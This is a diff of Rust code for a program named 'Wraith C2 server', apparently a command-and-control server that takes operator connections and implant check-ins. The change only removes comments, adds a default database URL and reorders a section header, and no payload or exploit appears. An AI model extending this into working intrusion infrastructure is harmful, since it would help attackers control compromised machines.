@@ -36,16 +36,12 @@ use shared::{
 #[derive(Parser)]
 #[command(about = "Wraith C2 server")]
 struct Args {
-    /// PostgreSQL connection string (overrides DATABASE_URL env var)
-    #[arg(long, env = "DATABASE_URL")]
+    #[arg(long, env = "DATABASE_URL", default_value = "postgres://localhost/wraith")]
     db: String,
-    /// gRPC address for the operator client
     #[arg(long, default_value = "0.0.0.0:50051")]
     grpc_addr: String,
-    /// HTTP address for login + implant check-ins
     #[arg(long, default_value = "0.0.0.0:8080")]
     http_addr: String,
-    /// When set, implant routes require this token in X-Wraith-Token
     #[arg(long, env = "REDIRECTOR_TOKEN")]
     redirector_token: Option<String>,
     #[command(subcommand)]
@@ -54,7 +50,6 @@ struct Args {
 
 #[derive(Subcommand)]
 enum Cmd {
-    /// Create or reset an admin operator account
     ProvisionAdmin {
         #[arg(long, default_value = "admin")]
         username: String,
@@ -66,7 +61,6 @@ enum Cmd {
 #[derive(Clone)]
 struct AppState {
     db:               PgPool,
-    /// token → (username, role)
     live_sessions:    Arc<RwLock<HashMap<String, (String, String)>>>,
     redirector_token: Option<String>,
 }
@@ -88,7 +82,7 @@ impl AppState {
     }
 }
 
-// ── Database helpers ──────────────────────────────────────────────────────────
+// ── Database schema ───────────────────────────────────────────────────────────
 
 async fn init_db(pool: &PgPool) -> Result<()> {
     sqlx::query(
@@ -135,6 +129,8 @@ async fn init_db(pool: &PgPool) -> Result<()> {
 
     Ok(())
 }
+
+// ── Database helpers ──────────────────────────────────────────────────────────
 
 async fn upsert_session(pool: &PgPool, c: &ImplantCheckin, sid: &str) -> Result<()> {
     let now = chrono_now();
